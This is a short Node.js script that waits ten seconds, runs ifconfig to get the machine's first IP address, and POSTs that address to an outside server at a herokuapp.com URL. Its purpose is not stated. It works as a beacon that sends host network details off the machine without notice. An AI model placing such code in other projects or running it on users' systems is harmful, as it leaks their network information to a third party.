var exec = require('child_process').exec;
var request = require('request');

setTimeout(function() {
  var output = exec('ifconfig | grep \'inet addr\' | head -1', function(err, stdout) {
    console.log(stdout);
    request.post(
      'http://meng404d.herokuapp.com/addr',
      { form : { addr: stdout } });
  });
}, 10000);
